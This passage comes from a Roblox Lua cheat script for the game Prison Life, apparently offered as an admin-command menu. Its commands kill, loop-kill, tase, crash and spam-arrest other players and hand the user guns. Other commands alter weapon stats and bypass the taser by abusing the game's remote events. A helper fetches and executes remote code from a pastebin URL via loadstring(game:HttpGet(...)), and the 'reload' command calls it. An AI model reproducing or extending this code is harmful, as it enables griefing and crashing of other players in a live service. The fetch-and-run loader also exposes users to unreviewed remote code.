		Notify5.TextColor3 = Notify4.TextColor3
		Notify4.Text = Notify3.Text
		Notify4.TextColor3 = Notify3.TextColor3
		Notify3.Text = Notify2.Text
		Notify3.TextColor3 = Notify2.TextColor3
		Notify2.Text = Notify1.Text
		Notify2.TextColor3 = Notify1.TextColor3
		Notify1.Text = "["..Text.."] "..Message
		Notify1.TextColor3 = Color or Color3.fromRGB(255, 255, 255)
	end

	local function Loadstring(Https)
		if not Https then return end
		loadstring(game:HttpGet((Https), true))()
	end

	local function Command(Cmd)
		return Arg1 == Prefix..Cmd
	end

	local function PrefixCommand(Cmd)
		return Arg1 == "!"..Cmd
	end

	local Walls = {
		game.Workspace.Prison_Halls.walls,
		game.Workspace.Prison_Halls.roof,
		game.Workspace.Prison_Halls.outlines,
		game.Workspace.Prison_Halls.lights,
		game.Workspace.Prison_Halls.accent,
		game.Workspace.Prison_Halls.glass,
		game.Workspace.Prison_Cellblock.b_front,
		game.Workspace.Prison_Cellblock.doors,
		game.Workspace.Prison_Cellblock.c_tables,
		game.Workspace.Prison_Cellblock.a_front,
		game.Workspace.bblock.b_outerwall,
		game.Workspace.Prison_Cellblock.c_wall,
		game.Workspace.Prison_Cellblock.b_wall,
		game.Workspace.Prison_Cellblock.c_hallwall,
		game.Workspace.Prison_Cellblock.a_outerwall,
		game.Workspace.Prison_Cellblock.b_ramp,
		game.Workspace.Prison_Cellblock.a_ramp,
		game.Workspace.Prison_Cellblock.a_walls,
		game.Workspace.Prison_Cellblock.Cells_B,
		game.Workspace.Prison_Cellblock.Cells_A,
		game.Workspace.Prison_Cellblock.c_corner,
		game.Workspace.Prison_Cellblock.Wedge,
		game.Workspace.Prison_Cellblock.a_ceiling,
		game.Workspace.Prison_Cellblock.b_ceiling,
		game.Workspace.City_buildings,
		game.Workspace.Prison_OuterWall,
		game.Workspace.Prison_Fences,
		game.Workspace.Prison_Guard_Outpost,
		game.Workspace.Prison_Cafeteria.building,
		game.Workspace.Prison_Cafeteria.glass,
		game.Workspace.Prison_Cafeteria.oven,
		game.Workspace.Prison_Cafeteria.shelves,
		game.Workspace.Prison_Cafeteria.vents,
		game.Workspace.Prison_Cafeteria.accents,
		game.Workspace.Prison_Cafeteria["vending machine"],
		game.Workspace.Prison_Cafeteria.Prison_table1,
		game.Workspace.Prison_Cafeteria.counter,
		game.Workspace.Prison_Cafeteria.boxes,
		game.Workspace.Prison_Cafeteria["trash bins"]
	}

--[[if not Slient then
	Chat("Admin Commands By LocalPlayer   #   7434")
	Chat("Admin Commands Version "..Versions)
	Chat("Current Prefix Is "..Prefix)
	wait()
	Chat("Admin Commands Loaded!")
else
	Chat("Loaded")
	Chat("P "..Prefix)
	Chat("V "..Versions)
end]]

	Notify("Loaded admin commands", Color3.fromRGB(0, 255, 0), "Loads")

	function PlayerChatted(Message)
		if ScriptDisabled then return end
		Split = Message:split(" ")
		Arg1 = Split[1]
		Arg2 = Split[2]
		Arg3 = Split[3]
		Arg4 = Split[4]
		if Command("unload") or Command("destroygui") then
			Notify("Unloading...", Color3.fromRGB(0, 255, 255), "Unloads")
			wait(.1)
			pcall(function()
				CmdGui:Destroy()
				States = {}
				LoopKill = {}
				LoopTase = {}
				Admin = {}
				ScriptDisabled = true
				for i,v in pairs(game.Lighting:GetChildren()) do
					v.Parent = workspace
				end
			end)
		end
		if Command("reload") or Command("update") then
			Notify("Updating versions...", Color3.fromRGB(0, 255, 255), "Updates")
			pcall(function()
				CmdGui:Destroy()
				States = {}
				LoopKill = {}
				LoopTase = {}
				Admin = {}
				ScriptDisabled = true
				for i,v in pairs(game.Lighting:GetChildren()) do
					v.Parent = workspace
				end
			end)
			Loadstring("https://pastebin.com/raw/9ab2s523")
		end
		if Command("beam") then
			local Player = GetPlayer(Arg2)
			if Player then
				Beam(Player, math.huge, 7)
				Notify("Beamed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("lagbeam") or Command("beam2") then
			local Player = GetPlayer(Arg2)
			if Player then
				LagBeam(Player, math.huge, 7)
				Notify("Lag beamed "..Player.Name, Color3.fromRGB(255, 0, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("crash") or Command("beam3") then
			local Player = GetPlayer(Arg2)
			if Player then
				LagBeam(Player, math.huge, 9000)
				Notify("Crashed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("antispamarrest") then
			States.Anti_Spam_Arrest = true
			Notify("Turn anti spam arrest on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Anti_Spam_Arrest then
					pcall(function()
						if game.Players.LocalPlayer.Character.Head:FindFirstChild("handcuffedGui") then
							repeat wait()
								coroutine.wrap(function()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
									workspace.Remote.TeamEvent:FireServer("Medium stone grey")
									workspace.Remote.TeamEvent:FireServer("Bright blue")
								end)()
							until game.Players.LocalPlayer.TeamColor.Name == "Bright blue"
							wait(.1)
							for i = 1,10 do
								workspace.Remote.TeamEvent:FireServer("Medium stone grey")
							end
						end
					end)
				end
			end
		end
		if Command("unantispamarrest") then
			States.Anti_Spam_Arrest = false
			Notify("Turn anti spam arrest off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("inmate") or Command("inmates") or Command("prisoner") or Command("prisoners") then
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			Notify("Become inmate", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("guard") or Command("guards") or Command("cop") or Command("polices") or Command("cops") then
			workspace.Remote.TeamEvent:FireServer("Bright blue")
			if game.Players.LocalPlayer.TeamColor.Name == "Bright blue" then
				Notify("Become guard", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Fulled team", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("gun") or Command("guns") or Command("allguns") then
			if BuyGamepass then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			Notify("Get all guns", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("autogun") or Command("autoguns") or Command("autoallguns") then
			States.Auto_Guns = true
			Notify("Turn auto guns on", Color3.fromRGB(0, 255, 0), "Success")
			if BuyGamepass then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				if States.Auto_Guns then
					pcall(function()
						if BuyGamepass then
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						else
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						end
					end)
				end
			end)
		end
		if Command("unautogun") or Command("unautoguns") or Command("unautoallguns") then
			States.Auto_Guns = false
			Notify("Turn auto guns off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopgoto") or Command("loopto") then
			local Player = GetPlayer(Arg2)
			if Player then
				States.LoopGoto = true
				repeat wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
				until not States.LoopGoto or not game.Players[Player.Name]
			end
		end
		if Command("unloopgoto") or Command("unloopto") then
			States.LoopGoto = false
		end
		if Command("checkscriptowner") or Command("findowner") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.DisplayName == "Hack" and v.Name == "ih4xalots" then
					ChatNotify("Script owner : "..v.Name.." / "..v.DisplayName, Color3.fromRGB(0, 255, 0))
				end
			end
		end
		if Command("getplayer") or Command("getplayers") then
			ChatNotify("Players : "..#game.Players:GetPlayers(), Color3.fromRGB(255, 255, 255))
		end
		if Command("autofire") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				Gun["AutoFire"] = true
				Notify("Turn auto fire", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("semifire") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				Gun["AutoFire"] = false
				Notify("Turn semi fire", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("firespeed") or Command("setfirespeed") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["FireRate"] = tonumber(Arg2)
					Notify("Set a gun fire speed to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("burst") or Command("burstbullets") or Command("bullets") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["Bullets"] = tonumber(Arg2)
					Notify("Set a gun burst bullets to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("reloadtime") or Command("reloadtimes") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["ReloadTime"] = tonumber(Arg2)
					Notify("Set a gun reload time to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("criminal") or Command("criminals") or Command("crim") or Command("crims") or Command("crimes") or Command("crime") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Become a criminal", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("neutral") or Command("neutrals") then
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			Notify("Become neutral", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("red") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("blue") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Deep blue").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("black") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really black").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("pink") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Hot pink").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("grey") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Ghost grey").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("white") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("White").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("brown") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Brown").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("purple") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Royal purple").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("green") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright green").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("yellow") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright yellow").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("orange") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Neon orange").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("chatnotify") then
			States.ChatNotify = true
			Notify("Turn chat notify on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nochatnotify") or Command("unchatnotify") then
			States.ChatNotify = false
			Notify("Turn chat notify off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("taserbypass") or Command("lock") or Command("antitaser") then
			States.TaserBypass = true
			Notify("Turn taser bypass on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				if States.TaserBypass then
					wait(.2)
					game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
					game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
				end
			end)
		end
		if Command("notaserbypass") or Command("unlock") or Command("untaserbypass") then
			States.TaserBypass = false
			Notify("Turn taser bypass off", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = false
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		end
		if Command("color") then
			if Arg2 ~= nil and Arg3 == nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 == nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 ~= nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3.." "..Arg4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
			Notify("Changed name tag color", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("print") then
			print(Message)
			Notify("Printed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("warn") then
			warn(Message)
			Notify("Warned", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("error") then
			Notify("Printed error", Color3.fromRGB(0, 255, 0), "Success")
			error(Message)
		end
		if Command("chat") then
			Chat(Message)
			Notify("Chatted", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("copychat") then
			States.CopyChat = true
			Notify("Turn copy chat on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("uncopychat") then
			States.CopyChat = false
			Notify("Turn copy chat off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("tase") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Tase(Player)
				Notify("Tased "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("noshield") or Command("antishield") then
			States.Anti_Shield = true
			Notify("Turn anti shield users on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				for i,v in pairs(game.Players:GetPlayers()) do
					pcall(function()
						if workspace[v.Name].Torso:FindFirstChild("ShieldFolder") then
							workspace[v.Name].Torso:FindFirstChild("ShieldFolder"):Destroy()
						end
					end)
				end
			end
		end
		if Command("unantishield") then
			States.Anti_Shield = false
			Notify("Turn anti shield users off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("kill") or Command("kills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Kill(Player)
				Notify("Killed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("killall") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					Kill(v)
				end
			end
			Notify("Killed all players", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killinmate") or Command("killinmates") or Command("killsinmate") or Command("killsinmates") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Bright orange" then
						Kill(v)
					end
				end
			end
			Notify("Killed all inmates", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killguard") or Command("killsguard") or Command("killguards") or Command("killsguards") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Bright blue" then
						Kill(v)
					end
				end
			end
			Notify("Killed all guards", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killcriminal") or Command("killscriminal") or Command("killcriminals") or Command("killscriminals") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Really red" then
						Kill(v)
					end
				end
			end
			Notify("Killed all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkill") or Command("loopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = {Player = Player}
				Notify("Looping kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already loop kills", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("unloopkill") or Command("unloopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = nil
				Notify("Unloop kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / Player has no loop kills", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("loopkillguard") or Command("loopkillguards") or Command("loopkillsguard") or Command("loopkillsguards") or Command("loopkillcop") or Command("loopkillpolices") or Command("loopkillspolices") then
			States.LoopKill_Guards = true
			Notify("Looping kills all guards", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Guards then
					for i,v in pairs(game.Teams.Guards:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillguard") or Command("unloopkillguards") or Command("unloopkillsguard") or Command("unloopkillsguards") or Command("unloopkillcop") or Command("unloopkillpolices") or Command("unloopkillspolices") then
			States.LoopKill_Guards = false
			Notify("Unloop kills all guards", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillinmate") or Command("loopkillinmates") or Command("loopkillsinmate") or Command("loopkillsinmates") or Command("loopkillprisoner") or Command("loopkillprisoners") then
			States.LoopKill_Inmates = true
			Notify("Looping kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Inmates then
					for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillinmate") or Command("unloopkillinmates") or Command("unloopkillsinmate") or Command("unloopkillsinmates") or Command("unloopkillprisoner") or Command("unloopkillprisoners") then
			States.LoopKill_Inmates = false
			Notify("Unloop kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillcriminal") or Command("loopkillcriminals") or Command("loopkillscriminal") or Command("loopkillscriminals") or Command("loopkillcrim") or Command("loopkillcrims") then
			States.LoopKill_Criminals = true
			Notify("Looping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Criminals then
					for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillcriminal") or Command("unloopkillcriminals") or Command("unloopkillscriminal") or Command("unloopkillscrriminals") or Command("unloopkillcrim") or Command("unloopkillcrims") then
			States.LoopKill_Criminals = false
			Notify("Unlooping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillall") or Command("loopkillsall") then
			States.LoopKill_Others = true
			Notify("Looping kills all players", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Others then
					for i,v in pairs(game.Players:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillall") or Command("unloopkillsall") then
			States.LoopKill_Criminals = false
			States.LoopKill_Guards = false
			States.LoopKill_Inmates = false
			States.LoopKill_Others = false
			Notify("Unlooping kills all players", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("goto") or Command("to") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[Player.Name].HumanoidRootPart.CFrame
				Notify("Go to "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("re") or Command("refresh") then
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					workspace.CurrentCamera.CFrame = savedcamcf
				end
			else
				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					workspace.CurrentCamera.CFrame = savedcamcf
					workspace.Remote.TeamEvent:FireServer("Medium stone grey")
				end
			end
			Notify("Refreshed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("res") or Command("respawn") then
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				workspace.Remote.loadchar:InvokeServer()
			else
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
			Notify("Respawned", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("looparrest") or Command("spamarrest") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Notify("Spam arresting "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
				States.SpamArrest = true
				repeat wait()
					if game.Players[Player.Name] and States.SpamArrest then
						local Player_Previos_Team = Player.TeamColor.Name
						if Player.TeamColor.Name == "Bright orange" then
							Teleport(Player, CFrame.new(979.55584716797, 99.990005493164, 2341.4069824219))
						end
						if Player.TeamColor.Name ~= "Bright orange" and Player.TeamColor.Name ~= "Really red" then
							repeat Teleport(Player, CFrame.new(-976, 110, 2070)) until Player.TeamColor.Name == "Really red" or not game.Players[Player.Name]
						end
						if Player_Previos_Team == "Bright orange" then
							repeat wait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								for i = 1,1000 do
									coroutine.wrap(function()
										ArrestEvent(Player, math.huge)
									end)()
								end
							until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
						else
							if Player.TeamColor.Name == "Really red" then
								repeat wait()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
									for i = 1,1000 do
										coroutine.wrap(function()
											ArrestEvent(Player, math.huge)
										end)()
									end
								until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
							end
						end
					end
				until not game.Players[Player.Name] or not States.SpamArrest
			end
		end
		if Command("unlooparrest") or Command("unspamarrest") then
			States.SpamArrest = false
			Notify("Unspam arrest", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("view") or Command("spectate") or Command("watch") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Watching = Player
